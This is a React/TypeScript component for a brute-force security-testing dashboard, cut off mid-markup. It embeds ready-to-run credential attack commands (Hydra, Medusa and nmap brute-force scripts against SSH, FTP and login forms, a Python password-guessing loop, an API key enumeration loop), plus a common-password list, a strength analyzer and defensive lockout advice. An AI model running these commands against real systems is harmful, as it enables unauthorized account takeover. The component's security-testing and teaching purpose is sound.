import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  AlertTriangle,
  CheckCircle2,
  Eye,
  EyeOff,
  KeyRound,
  Lock,
  ShieldAlert,
} from "lucide-react";
import { AnimatePresence, motion } from "motion/react";
import { useState } from "react";

// ─── Types ────────────────────────────────────────────────────────────────────

type AttackType = "http-basic" | "form-login" | "ssh" | "ftp" | "api-key";
type StrengthLevel = "Very Weak" | "Weak" | "Fair" | "Strong" | "Very Strong";

interface AttackProfile {
  type: AttackType;
  protocol: string;
  endpoint: string;
  charset: string;
  attemptsPerSec: string;
  severity: "Low" | "Medium" | "High" | "Critical";
}

interface PasswordAnalysis {
  password: string;
  entropy: number;
  crackTimeOffline: string;
  crackTimeOnline: string;
  charsets: string[];
  strength: StrengthLevel;
  score: number;
  recommendations: string[];
}

// ─── Data ─────────────────────────────────────────────────────────────────────

const ATTACK_TYPE_PROFILES: Record<AttackType, AttackProfile> = {
  "http-basic": {
    type: "http-basic",
    protocol: "HTTP/1.1",
    endpoint: "/login or Authorization header",
    charset: "Alphanumeric + special (!@#$%^&*)",
    attemptsPerSec: "500–5,000 req/s (uncapped) / 1–10 req/s (throttled)",
    severity: "High",
  },
  "form-login": {
    type: "form-login",
    protocol: "HTTP POST",
    endpoint: "/auth/login, /wp-login.php, /admin",
    charset: "Full printable ASCII (95 chars)",
    attemptsPerSec: "100–1,000 req/s (bypassing CSRF)",
    severity: "High",
  },
  ssh: {
    type: "ssh",
    protocol: "SSH v2",
    endpoint: "Port 22 (default)",
    charset: "Alphanumeric + common symbols",
    attemptsPerSec: "10–50 auth attempts/s per connection",
    severity: "Critical",
  },
  ftp: {
    type: "ftp",
    protocol: "FTP / FTPS",
    endpoint: "Port 21 (default)",
    charset: "Alphanumeric (common credentials)",
    attemptsPerSec: "20–200 attempts/s",
    severity: "Medium",
  },
  "api-key": {
    type: "api-key",
    protocol: "HTTPS REST",
    endpoint: "/api/v1/* (Authorization: Bearer header)",
    charset: "Hex/Base64 token space (2^128 keyspace)",
    attemptsPerSec: "N/A — token enumeration via leaked key patterns",
    severity: "Critical",
  },
};

const PAYLOAD_FORMATS: Record<AttackType, { label: string; code: string }[]> = {
  "http-basic": [
    {
      label: "cURL Command",
      code: `# Hydra HTTP Basic Auth brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
  -s 443 -S target.example.com http-get /admin/ \\
  -t 64 -f -v

# cURL manual test
curl -v --user "admin:password123" \\
  https://target.example.com/admin/ \\
  -H "User-Agent: Mozilla/5.0" \\
  --insecure`,
    },
    {
      label: "Raw HTTP Request",
      code: `POST /login HTTP/1.1\r
Host: target.example.com\r
Authorization: Basic YWRtaW46cGFzc3dvcmQ=\r
Content-Type: application/x-www-form-urlencoded\r
User-Agent: Mozilla/5.0 (Attack Simulation)\r
\r
[Base64(username:password) rotated per attempt]
[YWRtaW46MTIzNDU2 = admin:123456]`,
    },
  ],
  "form-login": [
    {
      label: "Hydra Form Attack",
      code: `# Hydra POST form login
hydra -l admin@target.com -P rockyou.txt \\
  target.example.com https-post-form \\
  "/api/auth/login:email=^USER^&password=^PASS^:Invalid credentials" \\
  -t 32 -f -v -o results.txt

# Burp Intruder equivalent setup:
# Position: password field
# Payload: Simple List → rockyou.txt
# Attack type: Sniper`,
    },
    {
      label: "Python Requests Script",
      code: `import requests

TARGET = "https://target.example.com/login"
USERNAME = "admin"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

session = requests.Session()

with open(WORDLIST) as f:
    for password in f:
        password = password.strip()
        resp = session.post(TARGET, data={
            "username": USERNAME,
            "password": password,
            "_token": get_csrf_token(session),
        }, allow_redirects=False)

        if resp.status_code == 302:
            print(f"[+] FOUND: {password}")
            break`,
    },
  ],
  ssh: [
    {
      label: "Hydra SSH Attack",
      code: `# SSH brute-force with Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt \\
  ssh://TARGET_IP:22 \\
  -t 4 -f -v

# Medusa SSH
medusa -u root -P passwords.txt \\
  -h TARGET_IP -M ssh -n 22 -t 4

# Nmap SSH brute script
nmap --script ssh-brute \\
  --script-args userdb=users.txt,passdb=pass.txt \\
  -p 22 TARGET_IP`,
    },
    {
      label: "Key-Based Enumeration",
      code: `# Check for weak SSH key algorithms
ssh-audit TARGET_IP

# Test default credentials
ssh -o StrictHostKeyChecking=no \\
  -o ConnectTimeout=3 \\
  root@TARGET_IP

# Common default creds:
# root:root, root:toor, root:password
# admin:admin, pi:raspberry (Raspberry Pi)
# ubuntu:ubuntu (Ubuntu cloud images)`,
    },
  ],
  ftp: [
    {
      label: "Hydra FTP Attack",
      code: `# FTP brute-force
hydra -l admin -P rockyou.txt \\
  ftp://TARGET_IP:21 \\
  -t 16 -f -v

# Test anonymous access
ftp TARGET_IP
# Username: anonymous
# Password: guest@example.com

# Nmap FTP brute script
nmap --script ftp-brute \\
  --script-args userdb=users.txt,passdb=pass.txt \\
  -p 21 TARGET_IP`,
    },
  ],
  "api-key": [
    {
      label: "API Key Pattern Attack",
      code: `# Check for API key leaks in public repos
# GitHub dork: site:github.com "api_key" "TARGET_DOMAIN"
# Google dork: site:pastebin.com "TARGET_DOMAIN" "api_key"

# Test leaked/guessable key patterns
curl -H "Authorization: Bearer LEAKED_KEY" \\
  https://api.target.example.com/v1/users/me

# IDOR via incremental API key IDs
for KEY_ID in $(seq 1000 1100); do
  curl -s "https://api.target.example.com/keys/$KEY_ID" \\
    -H "Authorization: Bearer $YOUR_KEY" \\
    | grep -v "403"
done`,
    },
  ],
};

const TOP_PASSWORDS = [
  { rank: 1, password: "123456", category: "Sequential numeric" },
  { rank: 2, password: "password", category: "Dictionary word" },
  { rank: 3, password: "12345678", category: "Sequential numeric" },
  { rank: 4, password: "qwerty", category: "Keyboard pattern" },
  { rank: 5, password: "123456789", category: "Sequential numeric" },
  { rank: 6, password: "12345", category: "Sequential numeric" },
  { rank: 7, password: "1234567", category: "Sequential numeric" },
  { rank: 8, password: "password1", category: "Dictionary + digit" },
  { rank: 9, password: "abc123", category: "Alpha + numeric" },
  { rank: 10, password: "iloveyou", category: "Common phrase" },
  { rank: 11, password: "111111", category: "Repeated numeric" },
  { rank: 12, password: "123123", category: "Repeated pattern" },
  { rank: 13, password: "admin", category: "Default credential" },
  { rank: 14, password: "letmein", category: "Common phrase" },
  { rank: 15, password: "1234567890", category: "Sequential numeric" },
  { rank: 16, password: "welcome", category: "Dictionary word" },
  { rank: 17, password: "monkey", category: "Dictionary word" },
  { rank: 18, password: "dragon", category: "Dictionary word" },
  { rank: 19, password: "sunshine", category: "Dictionary word" },
  { rank: 20, password: "master", category: "Dictionary word" },
];

const RECOMMENDATIONS = [
  {
    label: "Account Lockout Policy",
    desc: "Lock account after 5 failed attempts; unlock after 15-minute cooldown",
    priority: "Critical",
  },
  {
    label: "Multi-Factor Authentication",
    desc: "Require TOTP/FIDO2 second factor; blocks all credential-based attacks",
    priority: "Critical",
  },
  {
    label: "CAPTCHA on Login Forms",
    desc: "Invisible reCAPTCHA v3 or hCaptcha after 3 failed attempts",
    priority: "High",
  },
  {
    label: "IP-Based Rate Throttling",
    desc: "Max 10 attempts/minute per IP; progressive delay (1s, 2s, 4s, 8s…)",
    priority: "High",
  },
  {
    label: "Credential Stuffing Detection",
    desc: "Compare against HaveIBeenPwned API; reject known-breached passwords",
    priority: "High",
  },
  {
    label: "Password Strength Requirements",
    desc: "Min 12 chars, mixed case, digits, symbols; reject common patterns",
    priority: "Medium",
  },
  {
    label: "Login Anomaly Alerting",
    desc: "Alert user on new device/location; block unusual geographic patterns",
    priority: "Medium",
  },
  {
    label: "bcrypt/Argon2 Password Hashing",
    desc: "Use Argon2id with cost=3, memory=65536; never MD5/SHA1 for passwords",
    priority: "Critical",
  },
];

// ─── Password Analyzer Logic ──────────────────────────────────────────────────

function analyzePassword(pwd: string): PasswordAnalysis {
  const hasLower = /[a-z]/.test(pwd);
  const hasUpper = /[A-Z]/.test(pwd);
  const hasDigit = /[0-9]/.test(pwd);
  const hasSymbol = /[^a-zA-Z0-9]/.test(pwd);

  const poolSize =
    (hasLower ? 26 : 0) +
    (hasUpper ? 26 : 0) +
    (hasDigit ? 10 : 0) +
    (hasSymbol ? 32 : 0);

  const entropy = Math.round(pwd.length * Math.log2(Math.max(poolSize, 1)));

  const charsets: string[] = [];
  if (hasLower) charsets.push("lowercase a–z");
  if (hasUpper) charsets.push("uppercase A–Z");
  if (hasDigit) charsets.push("digits 0–9");
  if (hasSymbol) charsets.push("symbols");

  const guessesPerSec = 1e10; // offline MD5
  const totalCombinations = Math.max(poolSize, 1) ** pwd.length;
  const secondsOffline = totalCombinations / 2 / guessesPerSec;

  const formatTime = (seconds: number): string => {
    if (seconds < 1) return "< 1 second";
    if (seconds < 60) return `${Math.round(seconds)} seconds`;
    if (seconds < 3600) return `${Math.round(seconds / 60)} minutes`;
    if (seconds < 86400) return `${Math.round(seconds / 3600)} hours`;
    if (seconds < 31536000) return `${Math.round(seconds / 86400)} days`;
    if (seconds < 3.15e9) return `${Math.round(seconds / 31536000)} years`;
    return `${(seconds / 3.15e9).toExponential(1)} billion years`;
  };

  const crackTimeOffline = formatTime(secondsOffline);
  const crackTimeOnline = formatTime(secondsOffline * 1000); // throttled

  let score = 0;
  if (pwd.length >= 8) score += 20;
  if (pwd.length >= 12) score += 15;
  if (pwd.length >= 16) score += 15;
  if (hasLower) score += 10;
  if (hasUpper) score += 10;
  if (hasDigit) score += 10;
  if (hasSymbol) score += 15;
  if (entropy >= 50) score += 5;

  const strength: StrengthLevel =
    score < 20
      ? "Very Weak"
      : score < 40
        ? "Weak"
        : score < 60
          ? "Fair"
          : score < 80
            ? "Strong"
            : "Very Strong";

  const recommendations: string[] = [];
  if (pwd.length < 12) recommendations.push("Use at least 12 characters");
  if (!hasUpper) recommendations.push("Add uppercase letters (A–Z)");
  if (!hasSymbol) recommendations.push("Add symbols (!@#$%^&*)");
  if (!hasDigit) recommendations.push("Add digits (0–9)");
  if (TOP_PASSWORDS.some((p) => p.password === pwd.toLowerCase()))
    recommendations.push(
      "This password appears in known breach lists — change immediately",
    );
  if (recommendations.length === 0)
    recommendations.push(
      "Strong password — consider a passphrase for memorability",
    );

  return {
    password: pwd,
    entropy,
    crackTimeOffline,
    crackTimeOnline,
    charsets,
    strength,
    score: Math.min(score, 100),
    recommendations,
  };
}

// ─── Helper Components ────────────────────────────────────────────────────────

function SeverityBadge({ level }: { level: string }) {
  const styles: Record<string, string> = {
    Low: "bg-[oklch(0.15_0.03_145)] border-[oklch(0.40_0.14_145)] text-[oklch(0.72_0.18_155)]",
    Medium:
      "bg-[oklch(0.16_0.04_75)] border-[oklch(0.45_0.16_75)] text-[oklch(0.82_0.18_85)]",
    High: "bg-[oklch(0.16_0.04_55)] border-[oklch(0.45_0.18_55)] text-[oklch(0.78_0.20_55)]",
    Critical:
      "bg-[oklch(0.15_0.04_25)] border-[oklch(0.45_0.20_25)] text-[oklch(0.75_0.22_25)]",
  };
  return (
    <span
      className={`font-mono text-[10px] px-2 py-0.5 rounded border ${styles[level] ?? styles.Medium}`}
    >
      {level}
    </span>
  );
}

function PriorityBadge({ level }: { level: string }) {
  return <SeverityBadge level={level} />;
}

function StrengthColor(strength: StrengthLevel): string {
  return strength === "Very Weak"
    ? "oklch(0.65 0.22 25)"
    : strength === "Weak"
      ? "oklch(0.70 0.20 45)"
      : strength === "Fair"
        ? "oklch(0.82 0.18 75)"
        : strength === "Strong"
          ? "oklch(0.72 0.20 145)"
          : "oklch(0.78 0.22 145)";
}

// ─── Main Component ───────────────────────────────────────────────────────────

export function BruteForceAnalyzer() {
  const [target, setTarget] = useState("");
  const [attackType, setAttackType] = useState<AttackType>("http-basic");
  const [profile, setProfile] = useState<AttackProfile | null>(null);
  const [payloadTab, setPayloadTab] = useState<AttackType>("http-basic");
  const [password, setPassword] = useState("");
  const [passwordAnalysis, setPasswordAnalysis] =
    useState<PasswordAnalysis | null>(null);
  const [showPasswords, setShowPasswords] = useState(false);
  const [analyzed, setAnalyzed] = useState(false);

  const handleGenerate = (type?: AttackType) => {
    const t = type ?? attackType;
    setProfile(ATTACK_TYPE_PROFILES[t]);
    setPayloadTab(t);
    setAnalyzed(true);
  };

  const handlePreset = (type: AttackType) => {
    setAttackType(type);
    setProfile(ATTACK_TYPE_PROFILES[type]);
    setPayloadTab(type);
    setAnalyzed(true);
  };

  const handlePasswordAnalyze = () => {
    if (!password.trim()) return;
    setPasswordAnalysis(analyzePassword(password));
  };

  return (
    <div className="space-y-5">
      {/* Disclaimer */}
      <div className="rounded-lg border border-[oklch(0.50_0.18_75)] bg-[oklch(0.14_0.04_75)] px-4 py-3 flex items-start gap-3">
        <AlertTriangle className="w-4 h-4 text-[oklch(0.82_0.18_85)] shrink-0 mt-0.5" />
        <p className="font-mono text-xs text-[oklch(0.85_0.14_85)] leading-relaxed">
          <span className="font-bold text-[oklch(0.88_0.18_85)]">
            Authorized use only.
          </span>{" "}
          For authorized security testing only. Unauthorized use against systems
          you do not own is illegal.
        </p>
      </div>

      {/* Target Input Panel */}
      <div
        className="cyber-card rounded-lg p-6"
        style={{ borderColor: "oklch(0.42 0.18 25 / 0.6)" }}
      >
        <div className="flex items-center gap-2 mb-5">
          <div className="w-7 h-7 rounded bg-[oklch(0.15_0.04_25)] border border-[oklch(0.38_0.14_25)] flex items-center justify-center">
            <KeyRound className="w-3.5 h-3.5 text-[oklch(0.75_0.22_25)]" />
          </div>
          <div>
            <h2
              className="font-mono font-bold text-sm text-[oklch(0.75_0.22_25)] tracking-wider uppercase"
              style={{ textShadow: "0 0 8px oklch(0.75 0.22 25 / 0.5)" }}
            >
              Brute Force Security Testing
            </h2>
            <p className="font-mono text-[10px] text-muted-foreground">
              Generate attack profiles and analyze password strength for
              authorized testing
            </p>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row gap-3 mb-4">
          <Input
            data-ocid="bruteforce.target.input"
            value={target}
            onChange={(e) => setTarget(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && handleGenerate()}
            placeholder="https://target.example.com/login"
            className="font-mono text-sm bg-[oklch(0.11_0.01_240)] border-[oklch(0.28_0.04_220)] text-foreground placeholder:text-muted-foreground/50 focus-visible:ring-[oklch(0.75_0.22_25)] focus-visible:border-[oklch(0.50_0.18_25)]"
          />
          <Select
            value={attackType}
            onValueChange={(v) => setAttackType(v as AttackType)}
          >
            <SelectTrigger
              data-ocid="bruteforce.type.select"
              className="w-full sm:w-52 font-mono text-xs bg-[oklch(0.11_0.01_240)] border-[oklch(0.28_0.04_220)] text-foreground focus:ring-[oklch(0.75_0.22_25)]"
            >
              <SelectValue placeholder="Attack type" />
            </SelectTrigger>
            <SelectContent className="font-mono text-xs bg-[oklch(0.12_0.01_240)] border-[oklch(0.28_0.04_220)]">
              <SelectItem value="http-basic">HTTP Basic Auth</SelectItem>
              <SelectItem value="form-login">Form Login</SelectItem>
              <SelectItem value="ssh">SSH</SelectItem>
              <SelectItem value="ftp">FTP</SelectItem>
              <SelectItem value="api-key">API Key</SelectItem>
            </SelectContent>
          </Select>
          <Button
            data-ocid="bruteforce.analyze.button"
            onClick={() => handleGenerate()}
            className="font-mono text-xs px-5 bg-[oklch(0.18_0.04_25)] border border-[oklch(0.42_0.16_25)] text-[oklch(0.75_0.22_25)] hover:bg-[oklch(0.22_0.06_25)] hover:text-[oklch(0.85_0.24_25)] transition-all shrink-0"
            variant="outline"
          >
            <ShieldAlert className="w-3.5 h-3.5 mr-1.5" />
            Generate Profile
          </Button>
        </div>

        {/* Quick presets */}
        <div className="flex items-center gap-2 flex-wrap">
          <span className="font-mono text-[10px] text-muted-foreground">
            Presets:
          </span>
          {(["http-basic", "ssh", "api-key"] as const).map((type, i) => (
            <button
              key={type}
              type="button"
              data-ocid={`bruteforce.preset.button.${i + 1}`}
              onClick={() => handlePreset(type)}
              className="font-mono text-[10px] px-2 py-0.5 rounded border border-[oklch(0.28_0.04_220)] bg-[oklch(0.14_0.01_240)] text-[oklch(0.55_0.06_220)] hover:text-[oklch(0.75_0.22_25)] hover:border-[oklch(0.42_0.14_25)] transition-colors"
            >
              {type === "http-basic"
                ? "Weak Passwords"
                : type === "ssh"
                  ? "Common Credentials"
                  : "Default Credentials"}
            </button>
          ))}
        </div>
      </div>

      {/* Results */}
      <AnimatePresence>
        {analyzed && profile && (
          <motion.div
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-5"
          >
            {/* Attack Profile Card */}
            <motion.div
              data-ocid="bruteforce.profile.card"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.05 }}
              className="rounded-lg border border-[oklch(0.42_0.18_25)] bg-[oklch(0.13_0.01_240)]"
              style={{ boxShadow: "0 0 16px oklch(0.75 0.22 25 / 0.08)" }}
            >
              <div className="px-5 py-4 border-b border-[oklch(0.20_0.02_230)] flex items-center gap-2">
                <KeyRound className="w-4 h-4 text-[oklch(0.75_0.22_25)]" />
                <h3 className="font-mono text-sm font-bold text-[oklch(0.75_0.22_25)]">
                  Attack Profile
                </h3>
                <div className="ml-auto">
                  <SeverityBadge level={profile.severity} />
                </div>
              </div>
              <div className="p-5 grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">
                    Attack Type
                  </span>
                  <span className="font-mono text-sm font-semibold text-foreground capitalize">
                    {profile.type.replace(/-/g, " ")}
                  </span>
                </div>
                <div>
                  <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">
                    Protocol
                  </span>
                  <span className="font-mono text-xs text-[oklch(0.72_0.18_195)]">
                    {profile.protocol}
                  </span>
                </div>
                <div className="sm:col-span-2">
                  <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">
                    Target Endpoint
                  </span>
                  <span className="font-mono text-xs text-[oklch(0.78_0.18_75)]">
                    {profile.endpoint}
                  </span>
                </div>
                <div>
                  <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">
                    Charset
                  </span>
                  <span className="font-mono text-xs text-[oklch(0.75_0.04_200)]">
                    {profile.charset}
                  </span>
                </div>
                <div>
                  <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">
                    Est. Attempts/sec
                  </span>
                  <span className="font-mono text-xs text-[oklch(0.75_0.22_25)]">
                    {profile.attemptsPerSec}
                  </span>
                </div>
                {target && (
                  <div className="sm:col-span-2">
                    <span className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider block mb-1">
                      Target URL
                    </span>
                    <span className="font-mono text-xs text-[oklch(0.72_0.18_195)] break-all">
                      {target}
                    </span>
                  </div>
                )}
              </div>
            </motion.div>

            {/* Password Policy Analyzer */}
            <motion.div
              data-ocid="bruteforce.password.card"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.1 }}
              className="rounded-lg border border-[oklch(0.38_0.14_195)] bg-[oklch(0.13_0.01_240)]"
              style={{ boxShadow: "0 0 14px oklch(0.72 0.18 195 / 0.07)" }}
            >
              <div className="px-5 py-4 border-b border-[oklch(0.20_0.02_230)] flex items-center gap-2">
                <Lock className="w-4 h-4 text-[oklch(0.72_0.18_195)]" />
                <h3 className="font-mono text-sm font-bold text-[oklch(0.72_0.18_195)]">
                  Password Policy Analyzer
                </h3>
              </div>
              <div className="p-5 space-y-4">
                <div className="flex gap-2">
                  <Input
                    data-ocid="bruteforce.password.input"
                    type="text"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) =>
                      e.key === "Enter" && handlePasswordAnalyze()
                    }
                    placeholder="Enter a password to analyze strength…"
                    className="font-mono text-sm bg-[oklch(0.11_0.01_240)] border-[oklch(0.28_0.04_220)] text-foreground placeholder:text-muted-foreground/50 focus-visible:ring-[oklch(0.72_0.18_195)]"
                  />
                  <Button
                    data-ocid="bruteforce.password.button"
                    onClick={handlePasswordAnalyze}
                    disabled={!password.trim()}
                    className="font-mono text-xs px-4 bg-[oklch(0.16_0.03_195)] border border-[oklch(0.40_0.12_195)] text-[oklch(0.72_0.18_195)] hover:bg-[oklch(0.20_0.04_195)] transition-all shrink-0"
                    variant="outline"
                  >
                    Analyze
                  </Button>
                </div>

                <AnimatePresence>
                  {passwordAnalysis && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: "auto" }}
                      exit={{ opacity: 0, height: 0 }}
                      className="space-y-4 overflow-hidden"
                    >
                      {/* Strength bar */}
                      <div>
                        <div className="flex items-center justify-between mb-2">
                          <span className="font-mono text-xs text-muted-foreground">
                            Password Strength
                          </span>
                          <span
                            className="font-mono text-xs font-bold"
                            style={{
                              color: StrengthColor(passwordAnalysis.strength),
                            }}
                          >
                            {passwordAnalysis.strength}
                          </span>
                        </div>
                        <Progress
                          value={passwordAnalysis.score}
                          className="h-2 bg-[oklch(0.16_0.01_240)]"
                          style={{
                            // @ts-expect-error CSS custom property
                            "--progress-color": StrengthColor(
                              passwordAnalysis.strength,
                            ),
                          }}
                        />
                      </div>

                      {/* Stats grid */}
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                        {[
                          {
                            label: "Entropy",
                            value: `${passwordAnalysis.entropy} bits`,
                          },
                          {
                            label: "Length",
                            value: `${passwordAnalysis.password.length} chars`,
                          },
                          {
                            label: "Offline Crack",
                            value: passwordAnalysis.crackTimeOffline,
                          },
                          {
                            label: "Online Crack",
                            value: passwordAnalysis.crackTimeOnline,
                          },
                        ].map((stat) => (
                          <div
                            key={stat.label}
                            className="px-3 py-2.5 rounded border border-[oklch(0.22_0.03_220)] bg-[oklch(0.12_0.01_240)]"
                          >
                            <div className="font-mono text-[10px] text-muted-foreground mb-0.5">
                              {stat.label}
                            </div>
                            <div className="font-mono text-xs font-semibold text-foreground">
                              {stat.value}
                            </div>
                          </div>
                        ))}
                      </div>

                      {/* Charsets */}
                      <div>
                        <div className="font-mono text-[10px] text-muted-foreground mb-1.5">
                          Character Sets Detected
                        </div>
                        <div className="flex flex-wrap gap-1.5">
                          {[
                            "lowercase a–z",
                            "uppercase A–Z",
                            "digits 0–9",
                            "symbols",
                          ].map((cs) => (
                            <span
                              key={cs}
                              className={`font-mono text-[10px] px-2 py-0.5 rounded border ${
                                passwordAnalysis.charsets.includes(cs)
                                  ? "border-[oklch(0.40_0.14_145)] bg-[oklch(0.13_0.02_145)] text-[oklch(0.72_0.18_145)]"
                                  : "border-[oklch(0.22_0.03_220)] bg-[oklch(0.11_0.01_240)] text-muted-foreground/50"
                              }`}
                            >
                              {cs}
                            </span>
                          ))}
                        </div>
                      </div>

                      {/* Recommendations */}
                      <div>
                        <div className="font-mono text-[10px] text-muted-foreground mb-1.5">
                          Recommendations
                        </div>
                        <div className="space-y-1.5">
                          {passwordAnalysis.recommendations.map((rec) => (
                            <div
                              key={rec}
                              className="flex items-start gap-2 font-mono text-xs text-[oklch(0.72_0.06_200)]"
                            >
                              <span className="text-[oklch(0.75_0.22_25)] mt-0.5">
                                ›
                              </span>
                              {rec}
                            </div>
                          ))}
                        </div>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </motion.div>

            {/* Sample Payload Formats */}
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.15 }}
              className="rounded-lg border border-[oklch(0.35_0.10_25)] bg-[oklch(0.13_0.01_240)]"
              style={{ boxShadow: "0 0 14px oklch(0.75 0.22 25 / 0.06)" }}
            >
              <div className="px-5 py-4 border-b border-[oklch(0.20_0.02_230)] flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-[oklch(0.75_0.22_25)]" />
                <h3 className="font-mono text-sm font-bold text-[oklch(0.75_0.22_25)]">
                  Sample Payload Formats
                </h3>
              </div>
              <div className="p-4">
                <Tabs
                  value={payloadTab}
                  onValueChange={(v) => setPayloadTab(v as AttackType)}
                >
                  <TabsList className="bg-[oklch(0.12_0.01_240)] border border-[oklch(0.24_0.03_220)] h-auto p-0.5 gap-0.5 mb-4 flex-wrap">
                    {(
                      [
                        "http-basic",
                        "form-login",
                        "ssh",
                        "ftp",
                        "api-key",
                      ] as const
                    ).map((tab) => (
                      <TabsTrigger
                        key={tab}
                        data-ocid="bruteforce.payload.tab"
                        value={tab}
                        className="font-mono text-[10px] px-3 py-1.5 rounded data-[state=active]:bg-[oklch(0.18_0.03_25)] data-[state=active]:text-[oklch(0.75_0.22_25)] data-[state=active]:shadow-none text-[oklch(0.50_0.06_220)] uppercase tracking-wider"
                      >
                        {tab === "http-basic"
                          ? "HTTP Basic"
                          : tab === "form-login"
                            ? "Form Login"
                            : tab === "ssh"
                              ? "SSH"
                              : tab === "ftp"
                                ? "FTP"
                                : "API Key"}
                      </TabsTrigger>
                    ))}
                  </TabsList>

                  {(
                    [
                      "http-basic",
                      "form-login",
                      "ssh",
                      "ftp",
                      "api-key",
                    ] as const
                  ).map((tab) => (
                    <TabsContent
                      key={tab}
                      value={tab}
                      data-ocid="bruteforce.payload.panel"
                      className="mt-0 space-y-3"
                    >
                      {(PAYLOAD_FORMATS[tab] ?? []).map((fmt) => (
                        <div key={fmt.label} className="space-y-2">
                          <div className="font-mono text-[10px] text-[oklch(0.55_0.10_25)] uppercase tracking-wider">
                            {fmt.label}
                          </div>
                          <pre className="terminal-bg rounded p-4 font-mono text-[10px] text-[oklch(0.78_0.10_145)] leading-relaxed overflow-x-auto whitespace-pre-wrap break-all">
                            {fmt.code}
                          </pre>
                        </div>
                      ))}
                    </TabsContent>
                  ))}
                </Tabs>
              </div>
            </motion.div>

            {/* Wordlist Preview */}
            <motion.div
              data-ocid="bruteforce.wordlist.card"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2 }}
              className="rounded-lg border border-[oklch(0.35_0.10_55)] bg-[oklch(0.13_0.01_240)]"
              style={{ boxShadow: "0 0 14px oklch(0.78 0.20 55 / 0.06)" }}
            >
              <div className="px-5 py-4 border-b border-[oklch(0.20_0.02_230)] flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[oklch(0.78_0.20_55)]" />
                  <h3 className="font-mono text-sm font-bold text-[oklch(0.78_0.20_55)]">
                    Top 20 Common Passwords (rockyou.txt)
                  </h3>
                </div>
                <button
                  type="button"
                  data-ocid="bruteforce.wordlist.toggle"
                  onClick={() => setShowPasswords(!showPasswords)}
                  className="flex items-center gap-1.5 font-mono text-[10px] px-2.5 py-1 rounded border border-[oklch(0.30_0.06_55)] text-[oklch(0.65_0.14_55)] hover:border-[oklch(0.45_0.14_55)] hover:text-[oklch(0.78_0.20_55)] transition-colors"
                >
                  {showPasswords ? (
                    <EyeOff className="w-3 h-3" />
                  ) : (
                    <Eye className="w-3 h-3" />
                  )}
                  {showPasswords ? "Hide" : "Reveal"}
                </button>
              </div>
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-b border-[oklch(0.18_0.02_230)] hover:bg-transparent">
                      <TableHead className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider w-16">
                        Rank
                      </TableHead>
                      <TableHead className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider">
                        Password
                      </TableHead>
                      <TableHead className="font-mono text-[10px] text-muted-foreground uppercase tracking-wider">
                        Pattern Category
                      </TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {TOP_PASSWORDS.map((entry) => (
                      <TableRow
                        key={entry.rank}
                        className="border-b border-[oklch(0.16_0.01_230)] hover:bg-[oklch(0.14_0.01_240)] transition-colors"
                      >
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          #{entry.rank}
                        </TableCell>
                        <TableCell className="font-mono text-xs">
                          {showPasswords ? (
                            <span className="text-[oklch(0.75_0.22_25)]">
                              {entry.password}
                            </span>
                          ) : (
                            <span className="text-muted-foreground tracking-widest">
                              {"•".repeat(entry.password.length)}
                            </span>
                          )}
                        </TableCell>
                        <TableCell>
                          <span className="font-mono text-[10px] px-1.5 py-0.5 rounded bg-[oklch(0.14_0.01_240)] border border-[oklch(0.22_0.03_220)] text-muted-foreground">
                            {entry.category}
                          </span>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </motion.div>

            {/* Rate Limiting & Lockout Recommendations */}
            <motion.div
              data-ocid="bruteforce.recommendations.card"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.25 }}
              className="rounded-lg border border-[oklch(0.35_0.10_145)] bg-[oklch(0.13_0.01_240)]"
              style={{ boxShadow: "0 0 14px oklch(0.72 0.20 145 / 0.06)" }}
            >
              <div className="px-5 py-4 border-b border-[oklch(0.20_0.02_230)] flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-[oklch(0.72_0.20_145)]" />
                <h3 className="font-mono text-sm font-bold text-[oklch(0.72_0.20_145)]">
                  Rate Limiting & Lockout Recommendations
                </h3>
              </div>
              <div className="p-5 space-y-2">
                {RECOMMENDATIONS.map((rec) => (
                  <div
                    key={rec.label}
